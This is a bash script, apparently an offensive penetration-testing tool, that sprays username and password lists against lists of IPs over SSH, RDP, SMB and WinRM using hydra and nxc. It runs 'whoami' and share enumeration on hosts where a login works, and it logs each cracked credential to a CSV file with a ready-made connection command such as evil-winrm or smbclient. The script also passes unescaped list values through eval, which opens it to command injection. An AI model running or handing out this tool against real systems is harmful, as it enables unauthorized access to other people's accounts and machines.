#!/bin/bash

# Color codes for printing
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Function to display usage
usage() {
    echo "Usage: $0 [-a] [-v] [-s] <path to ip list> <path to usernames list> <path to passwords list>"
    echo "  -a: Test every username against every password."
    echo "  -v: Verbose mode. Print debug statements."
    echo "  -s: Suppress success messages."
    exit 1
}

# Initialize variables to control output and proxy usage
VERBOSE=false
SUPPRESS_SUCCESS=false
ALL_COMBINATIONS=false
DOMAIN=""

# Modify the option handling
while getopts "avs" option; do
    case $option in
        a)
            ALL_COMBINATIONS=true
            ;;
        v)
            VERBOSE=true
            ;;
        s)
            SUPPRESS_SUCCESS=true
            ;;
        *)
            usage
            ;;
    esac
done

shift "$((OPTIND-1))"

# Check for correct number of arguments
if [ "$#" -ne 3 ]; then
    usage
fi

# Prompt for domain
read -p "Enter the domain (leave empty if none): " DOMAIN

# Assign arguments to variables
IP_LIST=$1
USER_LIST=$2
PASS_LIST=$3

# Define CSV file to store results
RESULTS_CSV="results.csv"

# Check if CSV file exists and if not, create it and add headers
if [ ! -f "$RESULTS_CSV" ]; then
    echo "Service,IP,User,Password,Additional Info,Command" > "$RESULTS_CSV"
fi

# Function to perform checks and output only successful attempts
perform_check() {
    local service=$1
    local ip=$2
    local user=$3
    local pass=$4
    local username="${user##*\\}"
    local extra_args="${@:5}"
    local temp_output=$(mktemp)

    # Only print verbose (testing) output if VERBOSE is true
    if [ "$VERBOSE" = true ]; then
        echo "Testing $service: $ip with username: $username and password: $pass"
    fi

    case "$service" in
        ssh|rdp)
            command="hydra -l \"$username\" -p '$pass' -t 4 $service://$ip $extra_args"
            ;;
        smb|winrm)
            command="nxc $service $ip -u \"$username\" -p '$pass' $extra_args"
            ;;
    esac

    # Debug: Print the command being executed
    if [ "$VERBOSE" = true ]; then
        echo "Executing command: $command"
    fi

    eval $command > "$temp_output" 2>&1

    local log_command=""
    case "$service" in
        ssh)
            log_command="ssh $username@$ip"
            ;;
        rdp)
            log_command="xfreerdp /cert-ignore /compression /auto-reconnect /u:$username /p:'$pass' /v:$ip"
            ;;
        smb)
            log_command="smbclient \\\\\\\\$ip\\\\C -U '${username}%$pass' -W $DOMAIN"
            ;;
        winrm)
            log_command="evil-winrm -i $ip -u $username -p '$pass'"
            ;;
    esac

    if grep -q "1 of 1 target successfully completed" "$temp_output" || grep -q "\[+\]" "$temp_output"; then
        if [ "$SUPPRESS_SUCCESS" = false ]; then
            echo -e "${YELLOW}Success: $service login to $ip as $username with password $pass${NC}"
        fi

        local additional_info="Connection successful"
        # Append successful attempt to CSV, using the log_command for the connection command
        echo "$service,$ip,$username,$pass,$additional_info,\"$log_command\"" >> "$RESULTS_CSV"
    fi

    rm "$temp_output"
}

# Existing code to iterate over combinations and perform checks
if $ALL_COMBINATIONS; then
    while IFS= read -r user; do
        while IFS= read -r pass; do
            while IFS= read -r ip; do
                perform_check ssh $ip "$user" "$pass"
                perform_check rdp $ip "$user" "$pass"
                perform_check smb $ip "$user" "$pass" "--shares"
                perform_check winrm $ip "$user" "$pass" "-x whoami"
            done < "$IP_LIST"
        done < "$PASS_LIST"
    done < "$USER_LIST"
else
    paste -d: "$USER_LIST" "$PASS_LIST" | while IFS=: read -r user pass; do
        while IFS= read -r ip; do
            perform_check ssh $ip "$user" "$pass"
            perform_check rdp $ip "$user" "$pass"
            perform_check smb $ip "$user" "$pass" "--shares"
            perform_check winrm $ip "$user" "$pass" "-x whoami"
        done < "$IP_LIST"
    done
fi

# Print the file name with the CSV data
if [ "$SUPPRESS_SUCCESS" = false ]; then
    echo "Data was saved in the CSV file: $RESULTS_CSV"
fi
